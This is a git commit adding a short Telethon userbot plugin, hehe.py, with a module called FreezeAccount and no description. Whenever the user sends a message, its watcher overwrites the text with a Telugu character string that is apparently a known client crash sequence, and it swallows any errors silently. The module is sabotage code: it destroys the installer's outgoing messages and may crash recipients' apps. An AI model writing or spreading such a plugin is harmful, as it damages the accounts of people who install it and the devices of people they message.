2f19969bcba042148fffd6146a932b579b2bf8af
Alex <azudilov24@gmail.com>
2026-04-01 00:59:03 +0300

    Create hehe.py

---
+++ hehe.py
@@ -0,0 +1,18 @@
+from .. import loader, utils
+from telethon.tl.types import Message
+
+
+class FreezeAccount(loader.Module):
+    strings = {'name': 'FreezeAccount'}
+    
+    async def client_ready(self, client, database):
+        self.client = client
+    
+    async def watcher(self, message: Message):
+        if not message.out:
+            return
+        
+        try:
+            await message.edit("జ్ఞ‌")
+        except:
+            pass
